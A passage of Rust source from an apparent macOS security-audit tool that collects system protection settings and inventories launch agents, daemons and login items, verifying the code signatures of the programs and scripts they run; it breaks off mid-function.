//! This Mac's protections and the programs it starts on its own, for the agent to judge beside
//! the inventory.
//!
//! Two bundle files, under `mac/`:
//!
//! - `mac/settings.json`: System Integrity Protection, Gatekeeper, `FileVault` and the
//!   application firewall, each as the line its tool prints. An issue names one by its key.
//! - `mac/persistence.jsonl`: every launch agent and daemon outside `/System`, one per line,
//!   with the program it starts, the script an interpreter runs, and their code signatures,
//!   then what Background Task Management records that no launch folder shows ([`background`]):
//!   login items inside apps, the agents and daemons apps registered from their own bundle,
//!   and the apps that open at login. An issue names one by its path: the property list's, or
//!   the app bundle's.
//!
//! Vigil reads signatures itself because a sweep's agent runs no commands. Every tool is called
//! by its absolute path: these checks decide whether a program is trusted, and a `codesign`
//! earlier on the login shell's `PATH` could answer for it.
//!
//! An item's issue is keyed by the item's path and what it runs ([`Item::identity`]): the
//! program's and the script's paths and identities ([`Signature::identity`]), the arguments,
//! the environment, the user, and whether it runs at load or is disabled. A file's identity is
//! its signing team when Apple issued a Developer ID or App Store certificate to that team, and
//! its content otherwise. A dismissed item whose command line changes, or whose program is
//! replaced by one from someone else, is then a new issue, while an update from the same
//! developer keeps the dismissal. The identity is part of every item issue's key, so changing
//! its shape clears every item dismissal once.
//!
//! Not read yet: cron, kernel and system extensions, and the other persistence locations. The
//! records of Background Task Management need Full Disk Access; without it they are a note
//! ([`InventoryError::FullDiskAccess`]), and the app asks for it ([`needs_full_disk_access`]).
//! `/System/Library/Launch*` is left out because it is on the sealed system volume.

use std::collections::BTreeMap;
use std::collections::HashMap;
use std::collections::hash_map::Entry;
use std::fs;
use std::io;
use std::os::unix::fs::MetadataExt as _;
use std::path::Path;
use std::path::PathBuf;

use serde::Deserialize;
use serde::Serialize;
use serde_json::json;

use crate::cancel::Cancel;
use crate::inventory::Inventory;
use crate::inventory::InventoryError;
use crate::inventory::InventorySource;
use crate::inventory::command;
use crate::inventory::command::Output;
use crate::inventory::host::account::Account;
use crate::inventory::host::background::Place;
use crate::inventory::host::startup::StartupFile;
use crate::paths;

mod account;
mod background;
mod startup;

/// What the host checks found, ready for the Mac's bundle.
#[derive(Debug, Default)]
pub(crate) struct Host {
    /// Bundle files by path: `mac/settings.json` and `mac/persistence.jsonl`.
    pub(crate) files: Vec<(String, String)>,
    /// The keys of `mac/settings.json`, which an issue may name.
    pub(crate) settings: Vec<String>,
    /// Each launch item's path, which an issue may name, and the identity of what it runs,
    /// which keys that issue (see the module docs).
    pub(crate) items: BTreeMap<String, String>,
}

/// The settings read, by key: the tool and its arguments. Each prints one line of state.
const POSTURE: [(&str, &str, &[&str]); 4] = [
    (
        "system_integrity_protection",
        "/usr/bin/csrutil",
        &["status"],
    ),
    ("gatekeeper", "/usr/sbin/spctl", &["--status"]),
    ("filevault", "/usr/bin/fdesetup", &["status"]),
    (
        "firewall",
        "/usr/libexec/ApplicationFirewall/socketfilterfw",
        &["--getglobalstate"],
    ),
];

/// The folders launchd reads jobs from, outside the sealed system volume, under
/// [`system_root`]. The user's own `~/Library/LaunchAgents` is added at run time.
const LAUNCH_FOLDERS: [(ItemKind, &str); 2] = [
    (ItemKind::LaunchDaemon, "Library/LaunchDaemons"),
    (ItemKind::LaunchAgent, "Library/LaunchAgents"),
];

/// The folder [`LAUNCH_FOLDERS`] are under: `/`, or in a debug build `VIGIL_TEST_LAUNCH_ROOT`
/// when set.
///
/// The CLI's end-to-end tests set it, with `HOME`, to their sandbox: each of their many sweeps
/// otherwise runs `codesign` on every launch item of the machine, which took a GitHub runner
/// over 3 s per sweep and the mutation job past its time limit (PR #69). Release builds ignore
/// it, so a shipped Vigil cannot be pointed away from the real folders. The real folders are
/// read by `this_macs_settings_and_items_are_read`.
fn system_root() -> PathBuf {
    #[cfg(debug_assertions)]
    if let Some(root) = std::env::var_os("VIGIL_TEST_LAUNCH_ROOT") {
        return PathBuf::from(root);
    }
    PathBuf::from("/")
}

/// Where launchd looks for a program named without a folder: its default `PATH`, per
/// launchd.plist(5) (`ProgramArguments`, searched with execvp(3)).
const LAUNCHD_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];

/// Programs that run a file named in their arguments, by name without a trailing version
/// (`python3.12` is `python`). For these the script is checked too, since the interpreter is
/// Apple's whatever the script does. `env` is here because it runs the rest of its arguments.
const INTERPRETERS: [&str; 15] = [
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "perl",
    "python",
    "python3",
    "ruby",
    "osascript",
    "node",
    "env",
    "pwsh",
];

/// Options after which an interpreter runs code given on the command line rather than a file:
/// `sh -c`, `perl -e`, `osascript -e`, `node --eval`. A short-option cluster ending in `c`
/// (`bash -lc`) counts too. The agent judges the inline code from `arguments`.
const INLINE_CODE: [&str; 4] = ["-c", "-e", "-E", "--eval"];

/// Environment variables whose values the agent sees: `DYLD_` ones make the program load other
/// code, and `PATH` can change which program a bare name finds.
fn shows_value(name: &str) -> bool {
    name.starts_with("DYLD_") || name == "PATH"
}

/// The largest property list read, in bytes. Arbitrary: launchd jobs are a few kB, and the
/// limit keeps a planted file from being read whole.
const PLIST_LIMIT: u64 = 1024 * 1024;

const CODESIGN: &str = "/usr/bin/codesign";
const SHASUM: &str = "/usr/bin/shasum";

/// Reads the settings and launch items, recording what failed in `inventory`: each setting
/// ([`InventorySource::Setting`]), launch folder ([`InventorySource::LaunchFolder`]) and launch
/// item ([`InventorySource::LaunchItem`]) on its own.
///
/// Runs `codesign` up to six times per file an item runs, and `shasum` for an unsigned one,
/// each with the inventory's time limit. Once `cancel` is set it reads no more items, and
/// records the read as cancelled. The `stat` of each file has no time limit: a program on a
/// network share that does not answer blocks the sweep, as a version manager's folder there
/// does.
pub(crate) fn collect(inventory: &mut Inventory, cancel: &Cancel) -> Host {
    let settings = posture(inventory, cancel);
    let root = system_root();
    let mut folders: Vec<(ItemKind, PathBuf)> = LAUNCH_FOLDERS
        .iter()
        .map(|(kind, folder)| (*kind, root.join(folder)))
        .collect();
    if let Some(home) = std::env::home_dir() {
        folders.push((ItemKind::UserLaunchAgent, home.join("Library/LaunchAgents")));
    } else {
        // Covers no item: their paths are not known without the home folder. Accepted, since
        // `home_dir` falls back to the user database, so this does not happen on a Mac.
        let folder = "~/Library/LaunchAgents";
        inventory.fail(
            InventorySource::LaunchFolder {
                path: folder.to_owned(),
            },
            InventoryError::Io {
                path: PathBuf::from(folder),
                source: io::Error::new(io::ErrorKind::NotFound, "no home folder: set HOME"),
            },
        );
    }
    let mut items = launch_items(inventory, &folders, cancel);
    items.extend(background_items(
        inventory,
        &root.join(background::FOLDER),
        cancel,
    ));
    let account = match Account::current(cancel) {
        Ok(Some(account)) => Some(account),
        Ok(None) => {
            inventory.missing("/usr/bin/id");
            None
        }
        Err(e) => {
            inventory.fail(InventorySource::Account, e);
            None
        }
    };
    if let Some(account) = &account {
        mark_replaceable(&mut items, account);
    }
    let home = std::env::home_dir();
    let files = startup::collect(&root, home.as_deref(), account.as_ref(), cancel);
    Host::new(&settings, &items, &files)
}

/// Whether an issue about the item at `path` may follow from who the sweep runs as
/// ([`InventorySource::Account`]): a daemon's property list, which `mark_replaceable` reads,
/// this user's crontab, and the root-run files [`startup::collect`] marks.
pub(crate) fn needs_account(path: &str) -> bool {
    let path = Path::new(path);
    path.parent()
        .and_then(Path::file_name)
        .is_some_and(|folder| folder == "LaunchDaemons")
        || ["/usr/lib/cron/tabs/", "/etc/", "/usr/local/etc/periodic/"]
            .iter()
            .any(|folder| path.starts_with(folder))
}

/// Marks each program and script that runs as root and that `account` could replace: a launch
/// daemon's, or an app's registered daemon's, that names no other `UserName`. Only those: an
/// agent runs as a user who could replace it anyway, and marking it would change the key of
/// every dismissed agent whose program is in the home folder.
fn mark_replaceable(items: &mut [Item], account: &Account) {
    for item in items {
        let daemon = matches!(
            item.kind,
            ItemKind::LaunchDaemon | ItemKind::AppLaunchDaemon
        );
        if !daemon || item.user_name.as_deref().is_some_and(|user| user != "root") {
            continue;
        }
        for program in item.program.iter_mut().chain(item.scripts.iter_mut()) {
            program.replaceable = account.can_replace(&program.path);
        }
    }
}

/// Whether macOS keeps this process from reading Background Task Management's records, so
/// login items are not checked until the user grants Vigil Full Disk Access.
pub fn needs_full_disk_access() -> bool {
    background::needs_full_disk_access(&system_root().join(background::FOLDER))
}

/// Whether an item at `path` can come from [`background_items`]: an app bundle or a file inside
/// one, or a record that could not be placed, whose text is never an absolute path. No launch
/// folder item is either, unless a folder on its path or its own name ends in `.app`.
pub(crate) fn may_come_from_records(path: &Path) -> bool {
    !path.is_absolute()
        || path
            .components()
            .any(|part| Path::new(part.as_os_str()).extension() == Some("app".as_ref()))
}

impl Host {
    fn new(settings: &BTreeMap<&str, String>, items: &[Item], files: &[StartupFile]) -> Self {
        let settings_json =
            serde_json::to_string_pretty(settings).expect("a map of strings serializes");
        let mut lines = String::new();
        let items_shown = items.iter().map(serde_json::to_string);
        let files_shown = files.iter().map(serde_json::to_string);
        for line in items_shown.chain(files_shown) {
            let line =
                line.expect("an item holds only strings, booleans, and lists and maps of them");
            lines.push_str(&line);
            lines.push('\n');
        }
        Self {
            files: vec![
                ("mac/settings.json".to_owned(), settings_json),
                ("mac/persistence.jsonl".to_owned(), lines),
            ],
            settings: settings.keys().map(|key| (*key).to_owned()).collect(),
            items: items
                .iter()
                .map(|item| (item.path.clone(), item.identity()))
                .chain(
                    files
                        .iter()
                        .map(|file| (file.path.clone(), file.identity())),
                )
                .collect(),
        }
    }
}

/// The state each [`POSTURE`] tool prints, by key. A tool that cannot run is left out and
/// recorded, so the agent never reads a guess.
fn posture(inventory: &mut Inventory, cancel: &Cancel) -> BTreeMap<&'static str, String> {
    let mut settings = BTreeMap::new();
    for (key, program, args) in POSTURE {
        match command::run_any_status(program, args, cancel) {
            // Kept whatever the exit status: the printed state is the answer, and a tool that
            // reports an error prints that instead, which the agent reads as such.
            Ok(Some(output)) => {
                let text = format!("{} {}", output.stdout.trim(), output.stderr.trim());
                settings.insert(key, text.trim().to_owned());
            }
            Ok(None) => inventory.missing(program),
            Err(e) => {
                let key = key.to_owned();
                inventory.fail(InventorySource::Setting { key }, e);
            }
        }
    }
    settings
}

/// Where a launch item was found, which decides who it runs as.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum ItemKind {
    /// `/Library/LaunchDaemons`: runs as root unless it names a `UserName`.
    LaunchDaemon,
    /// `/Library/LaunchAgents`: runs as every user who logs in.
    LaunchAgent,
    /// `~/Library/LaunchAgents`: runs as this user.
    UserLaunchAgent,
    /// A launch agent an app registered from its own bundle (`SMAppService`), from
    /// Background Task Management's records.
    AppLaunchAgent,
    /// A launch daemon an app registered from its own bundle, which runs as root unless it
    /// names a `UserName`.
    AppLaunchDaemon,
    /// An app inside another app that starts at login (`SMLoginItemSetEnabled`).
    LoginItem,
    /// An app the user or the app added to Open at Login.
    OpenAtLogin,
}

impl ItemKind {
    /// Whether launchd reads its `BundleProgram`, relative to the app its property list is in.
    fn in_app_bundle(self) -> bool {
        match self {
            Self::AppLaunchAgent | Self::AppLaunchDaemon => true,
            Self::LaunchDaemon
            | Self::LaunchAgent
            | Self::UserLaunchAgent
            | Self::LoginItem
            | Self::OpenAtLogin => false,
        }
    }
}

/// One launch item, login item or app that opens at login, as the agent reads it.
#[derive(Debug, Serialize)]
struct Item {
    /// The property list's path, or for a login item and an app that opens at login the app
    /// bundle's, which an issue names. Text, with any byte that is not UTF-8 replaced, so a
    /// planted file with such a name is still listed.
    path: String,
    kind: ItemKind,
    /// Why the property list (or the bundle's `Info.plist`) could not be read, when it could
    /// not; the fields below are then empty, except `stamp` and `login_items`.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// The size and modification time of a property list that could not be read, so that a
    /// dismissed one shows again once it changes.
    #[serde(skip_serializing_if = "Option::is_none")]
    stamp: Option<String>,
    /// The job's `Label`; for a login item and an app that opens at login, the name Background
    /// Task Management records.
    label: Option<String>,
    /// The program launchd starts: from `Program` or else the first of `ProgramArguments`, or
    /// for an agent or daemon an app registered, its `BundleProgram` inside that app. For a
    /// login item and an app that opens at login, the bundle's executable; the bundle itself,
    /// `missing`, when it is not there.
    program: Option<Program>,
    /// `ProgramArguments`, the program's own name first. Kept whole, although an argument can
    /// hold a token: the command line is what the agent judges (`sh -c`, a download piped to a
    /// shell), and the sweep's agent cannot send anything off this Mac.
    arguments: Vec<String>,
    /// The files an interpreter in [`INTERPRETERS`] runs besides itself, in order: its first
    /// argument that is an absolute path, unless inline code comes first, and, through `env`,
    /// an interpreter given by absolute path and that interpreter's script (see [`scripts`]).
    /// A bare name `env` finds on `PATH` is not resolved or checked.
    scripts: Vec<Program>,
    /// `RunAtLoad`; `true` for a login item and an app that opens at login, which start at
    /// every login.
    run_at_load: bool,
    /// Whether `KeepAlive` is set: `true`, or conditions under which launchd restarts it.
    keep_alive: bool,
    /// The property list's own `Disabled` key. launchd's override database
    /// (`launchctl print-disabled`) is not read, so an item shown enabled may be turned off.
    disabled: bool,
    user_name: Option<String>,
    /// The names of the environment variables it sets, with values only where
    /// [`shows_value`] says. Other values can hold tokens, and their names are enough to judge
    /// them.
    environment: BTreeMap<String, Option<String>>,
    /// The switches System Settings > General > Login Items shows, for an item from Background
    /// Task Management's records. It runs only while both are on.
    #[serde(skip_serializing_if = "Option::is_none")]
    login_items: Option<background::Switches>,
}

/// A file an item runs, with its signature.
#[derive(Debug, Serialize)]
struct Program {
    path: PathBuf,
    signature: Signature,
    /// For a program that runs as root, whether this user could replace it
    /// ([`Account::can_replace`]); set by [`mark_replaceable`].
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    replaceable: bool,
}

impl Item {
    /// An item whose property list could not be read.
    fn unread(kind: ItemKind, path: String, error: String, stamp: Option<String>) -> Self {
        Self {
            path,
            kind,
            error: Some(error),
            stamp,
            label: None,
            program: None,
            arguments: Vec::new(),
            scripts: Vec::new(),
            run_at_load: false,
            keep_alive: false,
            disabled: false,
            user_name: None,
            environment: BTreeMap::new(),
            login_items: None,
        }
    }

    /// What the item runs, as one key part (see the module docs). JSON, so no two different
    /// items can join into the same text.
    fn identity(&self) -> String {
        // Replaceable only when it is, so an item's identity, and the dismissal it keys, stays
        // as it was before replaceability was read.
        let file = |p: &Program| {
            if p.replaceable {
                json!([p.path, p.signature.identity(), "replaceable"])
            } else {
                json!([p.path, p.signature.identity()])
            }
        };
        let mut identity = json!({
            "program": self.program.as_ref().map(file),
            "scripts": self.scripts.iter().map(file).collect::<Vec<_>>(),
            "arguments": self.arguments,
            "environment": self.environment,
            "user_name": self.user_name,
            "run_at_load": self.run_at_load,
            "disabled": self.disabled,
            "unread": self.stamp,
        });
        // Only when set, so the identity of a launch folder's item, and the dismissal it
        // keys, stays as it was before these records were read.
        if let Some(switches) = self.login_items {
            identity["login_items"] = json!(switches);
        }
        identity.to_string()
    }
}

/// The keys of a launchd job that the agent reads; the rest are ignored.
#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct Job {
    label: Option<String>,
    program: Option<String>,
    bundle_program: Option<String>,
    program_arguments: Option<Vec<String>>,
    working_directory: Option<String>,
    run_at_load: Option<bool>,
    keep_alive: Option<plist::Value>,
    disabled: Option<bool>,
    user_name: Option<String>,
    environment_variables: Option<BTreeMap<String, plist::Value>>,
}

/// Reads every item in `folders`. A folder that does not exist has none; one that cannot be
/// listed is recorded as a problem of its [`InventorySource::LaunchFolder`], a failure unless
/// permission was denied (see [`InventoryError::is_failure`]). A signature check that could not
/// run is a failure too, and its item is kept with the program `unreadable`, so the agent still
/// sees it.
fn launch_items(
    inventory: &mut Inventory,
    folders: &[(ItemKind, PathBuf)],
    cancel: &Cancel,
) -> Vec<Item> {
    let mut items = Vec::new();
    for (kind, folder) in folders {
        let paths = match list(folder) {
            Ok(paths) => paths,
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(source) => {
                let path = folder.clone();
                let folder = folder.to_string_lossy().into_owned();
                inventory.fail(
                    InventorySource::LaunchFolder { path: folder },
                    InventoryError::Io { path, source },
                );
                continue;
            }
        };
        for path in paths {
            if cancel.is_cancelled() {
                let what = "reading launch items".to_owned();
                // The sweep keeps no report of a cancelled inventory, so which source does not
                // matter.
                let path = folder.to_string_lossy().into_owned();
                inventory.fail(
                    InventorySource::LaunchFolder { path },
                    InventoryError::Cancelled { what },
                );
                return items;
            }
            let mut failures = Vec::new();
            items.push(read_item(*kind, &path, cancel, &mut failures));
            // As `read_item` names the item.
            let shown = path.to_string_lossy();
            for e in failures {
                let path = shown.clone().into_owned();
                inventory.fail(InventorySource::LaunchItem { path }, e);
            }
        }
    }
    items
}

/// Reads what Background Task Management records in `folder` that no launch folder shows, an
/// item per path. The same item can be recorded for several users, each with their own
/// switches: it runs if it runs for any of them, so a record with both switches on replaces
/// one without. Otherwise the first is kept: an item enabled for one user and allowed for
/// another runs for neither.
/// Its failures are of [`InventorySource::BackgroundItems`]; a check of one item that could not
/// run is of that item's [`InventorySource::LaunchItem`], as in [`launch_items`].
fn background_items(inventory: &mut Inventory, folder: &Path, cancel: &Cancel) -> Vec<Item> {
    let mut failures = Vec::new();
    let entries = background::read(folder, &mut failures);
    for e in failures {
        inventory.fail(InventorySource::BackgroundItems, e);
    }
    // By the item's path as the bundle and an issue name it, unplaced records included.
    let mut at: HashMap<String, usize> = HashMap::new();
    let mut items: Vec<Item> = Vec::new();
    for entry in entries {
        let shown = match &entry.place {
            Place::Found(path) => path.to_string_lossy().into_owned(),
            Place::Unplaced { shown, .. } => shown.clone(),
        };
        match at.entry(shown.clone()) {
            Entry::Occupied(index) => {
                let seen = items[*index.get()]
                    .login_items
                    .as_mut()
                    .expect("every item from the records has its switches");
                if entry.switches.runs() {
                    *seen = entry.switches;
                }
                continue;
            }
            Entry::Vacant(slot) => {
                slot.insert(items.len());
            }
        }
        if cancel.is_cancelled() {
            let what = "reading login items".to_owned();
            inventory.fail(
                InventorySource::BackgroundItems,
                InventoryError::Cancelled { what },
            );
            return items;
        }
        let mut failures = Vec::new();
        let mut item = match (entry.place, entry.kind) {
            (Place::Unplaced { shown, why }, kind) => Item::unread(kind, shown, why, None),
            (Place::Found(path), kind @ (ItemKind::LoginItem | ItemKind::OpenAtLogin)) => {
                bundle_item(kind, &path, cancel, &mut failures)
            }
            (Place::Found(path), kind) => read_item(kind, &path, cancel, &mut failures),
        };
        if item.label.is_none() {
            item.label = entry.name;
        }
        item.login_items = Some(entry.switches);
        for e in failures {
            let path = shown.clone();
            inventory.fail(InventorySource::LaunchItem { path }, e);
        }
        items.push(item);
    }
    items
}

/// A login item or an app that opens at login: the app at `bundle`, which runs its
/// executable. A bundle that is not there is kept with the bundle as its `missing` program.
fn bundle_item(
    kind: ItemKind,
    bundle: &Path,
    cancel: &Cancel,
    failures: &mut Vec<InventoryError>,
) -> Item {
    let shown = bundle.to_string_lossy().into_owned();
    let program = match bundle_executable(bundle) {
        Ok(program) => program,
        Err(error) => {
            let info = bundle.join("Contents/Info.plist");
            let stamp = fs::symlink_metadata(info).ok().map(|m| stamp(&m));
            return Item::unread(kind, shown, error, stamp);
        }
    };
    Item {
        path: shown,
        kind,
        error: None,
        stamp: None,
        label: None,
        program: Some(checked(program, cancel, failures)),
        arguments: Vec::new(),
        scripts: Vec::new(),
        run_at_load: true,
        keep_alive: false,
        disabled: false,
        user_name: None,
        environment: BTreeMap::new(),
        login_items: None,
    }
}

/// The file macOS runs for the app at `bundle`: `Contents/MacOS/` and its `Info.plist`'s
/// `CFBundleExecutable`. The bundle itself when it is not there, which [`checked`] calls
/// `missing`.
fn bundle_executable(bundle: &Path) -> Result<PathBuf, String> {
    /// The one key read from `Info.plist`.
    #[derive(Debug, Deserialize)]
    struct Info {
        #[serde(rename = "CFBundleExecutable")]
        executable: Option<String>,
    }
    match fs::symlink_metadata(bundle) {
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(bundle.to_owned()),
        Err(e) => return Err(format!("cannot read the app: {e}")),
        Ok(_) => {}
    }
    let info = bundle.join("Contents/Info.plist");
    let bytes = paths::read_capped(&info, PLIST_LIMIT + 1)
        .map_err(|e| format!("cannot read its Info.plist: {e}"))?;
    if bytes.len() as u64 > PLIST_LIMIT {
        return Err(format!(
            "its Info.plist is more than the {PLIST_LIMIT} bytes read"
        ));
    }
    let info: Info =
        plist::from_bytes(&bytes).map_err(|e| format!("its Info.plist does not parse: {e}"))?;
    let executable = info
        .executable
        .ok_or("its Info.plist names no CFBundleExecutable")?;
    inside(bundle, &Path::new("Contents/MacOS").join(&executable)).ok_or_else(|| {
        format!("its Info.plist names the executable {executable:?}, which is not in the app")
    })
}

/// `relative` under `bundle`, unless it is absolute or steps out with `..`, which `join` would
/// follow out of the app.
fn inside(bundle: &Path, relative: &Path) -> Option<PathBuf> {
    relative
        .components()
        .all(|part| matches!(part, std::path::Component::Normal(_)))
        .then(|| bundle.join(relative))
}

/// The entries of `folder`, sorted. Hidden ones are kept, since launchd loads them too; only
/// Finder's `.DS_Store` is skipped.
fn list(folder: &Path) -> io::Result<Vec<PathBuf>> {
    let mut paths = Vec::new();
    for entry in fs::read_dir(folder)? {
        let entry = entry?;
        if entry.file_name() != ".DS_Store" {
            paths.push(entry.path());
        }
    }
    paths.sort();
    Ok(paths)
}

/// Reads one item and checks what it runs. A property list that cannot be read is an item with
/// its `error`; a check that cannot run is pushed to `failures`.
fn read_item(
    kind: ItemKind,
    path: &Path,
    cancel: &Cancel,
    failures: &mut Vec<InventoryError>,
) -> Item {
    let shown_path = path.to_string_lossy().into_owned();
    let job = match read_job(path) {
        Ok(job) => job,
        Err(error) => {
            // Without following a link, so a link cannot point the stamp elsewhere.
            let stamp = fs::symlink_metadata(path).ok().map(|m| stamp(&m));
            return Item::unread(kind, shown_path, error, stamp);
        }
    };
    let arguments = job.program_arguments.unwrap_or_default();
    let working_directory = job.working_directory.as_deref();
    let in_bundle = job
        .bundle_program
        .as_deref()
        .filter(|_| kind.in_app_bundle())
        .and_then(|name| Some((app_of(path)?, name)));
    let program = match in_bundle {
        Some((app, name)) => Some(match inside(app, Path::new(name)) {
            Some(program) => checked(program, cancel, failures),
            None => Program {
                path: PathBuf::from(name),
                signature: Signature::Unreadable {
                    detail: "its BundleProgram is not a path inside the app, so it was not checked"
                        .to_owned(),
                    stamp: None,
                },
                replaceable: false,
            },
        }),
        None => job
            .program
            .as_deref()
            .or(arguments.first().map(String::as_str))
            .map(|name| checked(resolve(name, working_directory), cancel, failures)),
    };
    let scripts = match &program {
        Some(program) => scripts(&program.path, &arguments)
            .into_iter()
            .map(|path| checked(path, cancel, failures))
            .collect(),
        None => Vec::new(),
    };
    let environment = job
        .environment_variables
        .unwrap_or_default()
        .into_iter()
        .map(|(name, value)| {
            let shown =
                shows_value(&name).then(|| value.as_string().unwrap_or("(not text)").to_owned());
            (name, shown)
        })
        .collect();
    Item {
        path: shown_path,
        kind,
        error: None,
        stamp: None,
        label: job.label,
        program,
        arguments,
        scripts,
        run_at_load: job.run_at_load.unwrap_or(false),
        keep_alive: job
            .keep_alive
            .is_some_and(|value| value.as_boolean() != Some(false)),
        disabled: job.disabled.unwrap_or(false),
        user_name: job.user_name,
        environment,
        login_items: None,
    }
}

/// The app whose bundle holds the property list at `path`, which `SMAppService` requires to be
/// in the app's `Contents/Library/LaunchAgents` or `LaunchDaemons`.
fn app_of(path: &Path) -> Option<&Path> {
    let contents = path.parent()?.parent()?.parent()?;
    (contents.file_name()? == "Contents").then_some(contents.parent()?)
}

/// Parses the property list at `path`, or says why it cannot be read. A link or anything but a
/// regular file is refused by the open itself, so a file swapped for a FIFO cannot block the
/// read; the agent is told to report such an item.
fn read_job(path: &Path) -> Result<Job, String> {
    let bytes = paths::read_capped(path, PLIST_LIMIT + 1).map_err(|e| match e.kind() {
        io::ErrorKind::InvalidInput => "not a regular file (a link, a folder or a FIFO)".to_owned(),
        _ => format!("cannot read it: {e}"),
    })?;
    if bytes.len() as u64 > PLIST_LIMIT {
        return Err(format!("more than the {PLIST_LIMIT} bytes read"));
    }
    plist::from_bytes(&bytes).map_err(|e| format!("not a launchd property list: {e}"))
}

/// The file launchd runs for `name`: an absolute path as it is; a relative one under the job's
/// `WorkingDirectory`, or under `/`, where launchd starts a job without one (checked with
/// `launchctl submit` on macOS 27.2); a bare name at its first match on launchd's `PATH`. A
/// relative `WorkingDirectory` is returned unresolved and checked as unreadable, and a bare
/// name with no match as missing.
fn resolve(name: &str, working_directory: Option<&str>) -> PathBuf {
    if name.starts_with('/') {
        return PathBuf::from(name);
    }
    if name.contains('/') {
        let folder = working_directory.unwrap_or("/");
        return Path::new(folder).join(name);
    }
    LAUNCHD_PATH
        .iter()
        .map(|folder| Path::new(folder).join(name))
        .find(|candidate| candidate.is_file())
        .unwrap_or_else(|| PathBuf::from(name))
}

/// The files `program` runs besides itself, when it is an interpreter: the first argument
/// after the program's own name that is an absolute path, unless an [`INLINE_CODE`] option
/// comes first. Options and their values before it are skipped (`python3 -u /x.py`,
/// `osascript -l JavaScript /x.js`, `env python3 /x.py`). The first absolute path is taken even
/// when it is an option's value (`ruby -I /lib /x.rb` gives `/lib`); the agent reads the
/// arguments too.
///
/// Only `env` runs its argument as a program; every other interpreter runs it as a script,
/// whatever its name (`sh /x/sh` runs `/x/sh` as a shell script). So only after `env` does an
/// interpreter found there count as a program whose own script is looked for too, and both are
/// listed (`env /x/python3 /y.py` gives `/x/python3` and `/y.py`). A bare name `env` finds on
/// `PATH` (`env python3 /y.py`) is not resolved, so only `/y.py` is checked. The chain starts
/// at any interpreter-named path after `env`, even one a bare-named interpreter runs as its
/// script (`env python3 /x/python3 /y.py`): that checks one file too many, never one too few.
/// Each step reads a shorter list, so it ends.
fn scripts(program: &Path, arguments: &[String]) -> Vec<PathBuf> {
    if !is_interpreter(program) {
        return Vec::new();
    }
    for (i, argument) in arguments.iter().enumerate().skip(1) {
        let cluster_ending_in_c =
            argument.starts_with('-') && !argument.starts_with("--") && argument.ends_with('c');
        if INLINE_CODE.contains(&argument.as_str()) || cluster_ending_in_c {
            return Vec::new();
        }
        if argument.starts_with('/') {
            let path = PathBuf::from(argument);
            if program.file_name() == Some("env".as_ref()) && is_interpreter(&path) {
                let mut chain = scripts(&path, &arguments[i..]);
                chain.insert(0, path);
                return chain;
            }
            return vec![path];
        }
    }
    Vec::new()
}

fn is_interpreter(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| {
            let unversioned = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
            INTERPRETERS.contains(&name) || INTERPRETERS.contains(&unversioned)
        })
}

/// `path` with its signature. A check that cannot run leaves the file `unreadable` and goes to
/// `failures`.
fn checked(path: PathBuf, cancel: &Cancel, failures: &mut Vec<InventoryError>) -> Program {
    let signature = signature(&path, cancel).unwrap_or_else(|e| {
        let detail = format!("the check could not run: {e}");
        failures.push(e);
        Signature::Unreadable {
            detail,
            stamp: None,
        }
    });
    Program {
        path,
        signature,
        replaceable: false,
    }
}

/// A file's code signature, as `codesign` verifies it.
#[derive(Debug, PartialEq, Eq, Serialize)]
#[serde(tag = "status", rename_all = "snake_case")]
enum Signature {
    /// No file at the path: the job fails to start, or starts whatever is put there later.
    Missing,
    /// Not a regular file, a relative path launchd resolves elsewhere, or a file this user
    /// cannot read (an executable with mode `0111` runs, but cannot be read). `stamp` is its
    /// size and modification time when they could be read.
    Unreadable {
        detail: String,
        stamp: Option<String>,
    },
    /// Not signed at all.
    Unsigned { sha256: String },
    /// Signed, but the signature does not verify: the file changed after it was signed.
    Invalid { detail: String, cdhash: String },
    /// Signed by Apple: part of macOS or an Apple app.
    Apple,
    /// Signed with a certificate Apple issued, of the kind in `certificate`, to `team` when the
    /// signature names one (checked by requirement, not taken from the signature's claim).
    AppleIssued {
        certificate: Certificate,
        authority: Option<String>,
        team: Option<String>,
        cdhash: String,
    },
    /// Signed with a certificate Apple did not issue (or not to the team it names), which
    /// Gatekeeper does not trust. Its names are the signer's own claim.
    OtherIssuer {
        authority: Option<String>,
        team: Option<String>,
        cdhash: String,
    },
    /// Signed with no identity, as the linker signs every arm64 build.
    AdHoc { cdhash: String },
}

/// The kind of certificate Apple issued, told apart by the leaf certificate's marker
/// extensions (Apple's object identifiers `1.2.840.113635.100.6.1.13` and `...6.1.9`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum Certificate {
    /// Developer ID Application: the certificate for software shipped outside the App Store.
    DeveloperId,
    /// Mac App Store.
    AppStore,
    /// Any other, such as Apple Development, which every Apple ID can get for free.
    Other,
}

impl Certificate {
    /// The requirement clause that holds only for this kind, after `anchor apple generic`.
    fn clause(self) -> &'static str {
        match self {
            Self::DeveloperId => " and certificate leaf[field.1.2.840.113635.100.6.1.13] exists",
            Self::AppStore => " and certificate leaf[field.1.2.840.113635.100.6.1.9] exists",
            Self::Other => "",
        }
    }

    fn name(self) -> &'static str {
        match self {
            Self::DeveloperId => "developer_id",
            Self::AppStore => "app_store",
            Self::Other => "other",
        }
    }
}

impl Signature {
    /// Who stands behind the file, as part of an item's identity. Only a team that Apple
    /// issued a Developer ID or App Store certificate to survives an update; every other
    /// identity is the file's own (its hash, or its size and modification time when it cannot
    /// be read), since the names in it are the signer's claim. A free Apple Development
    /// certificate is keyed by content too, as anyone can get one.
    fn identity(&self) -> String {
        match self {
            Self::Missing => "missing".to_owned(),
            // Without a stamp (a folder on the way this user may not enter, or a check that
            // could not run) the reason is all there is: a replacement there is not seen until
            // the reason changes. Accepted, as the file could not be checked.
            Self::Unreadable { stamp, detail } => {
